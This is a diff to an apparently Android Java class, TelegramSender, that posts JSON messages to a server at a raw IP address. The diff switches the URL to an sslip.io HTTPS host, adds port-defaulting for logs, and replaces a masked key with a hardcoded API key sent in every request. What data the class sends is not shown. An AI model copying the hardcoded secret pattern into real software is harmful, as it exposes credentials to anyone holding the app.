@@ -20,7 +20,7 @@ import java.util.concurrent.Executors;
 public class TelegramSender {
 
     private static final String TAG = "TelegramSender";
-    private static final String SERVER_URL = "http://37.49.226.139:5002/send";
+    private static final String SERVER_URL = "https://37.49.226.139.sslip.io/p5000/send";
     private static final String SERVER_API_KEY = "A7f9xP22sKp90ZqLm";
 
     private final Context context;
@@ -143,7 +143,13 @@ public class TelegramSender {
 
             Uri uri = Uri.parse(SERVER_URL);
             logToFile("SERVER HOST = " + uri.getHost());
-            logToFile("SERVER PORT = " + uri.getPort());
+            int port = uri.getPort();
+            if (port == -1) {
+                String scheme = uri.getScheme();
+                if ("https".equalsIgnoreCase(scheme)) port = 443;
+                else if ("http".equalsIgnoreCase(scheme)) port = 80;
+            }
+            logToFile("SERVER PORT = " + port);
             logToFile("SERVER PATH = " + uri.getPath());
 
             logToFile("sendToServerSync CALLED FROM HERE");
@@ -177,7 +183,7 @@ public class TelegramSender {
             logToFile("InstanceFollowRedirects = " + conn.getInstanceFollowRedirects());
 
             String json = "{"
-                    + "\"api_key\":\"" + "***" + "\","
+                    + "\"api_key\":\"" + escapeJson(SERVER_API_KEY) + "\","
                     + "\"type\":\"" + escapeJson(finalType) + "\","
                     + "\"text\":\"" + escapeJson(text) + "\""
                     + "}";
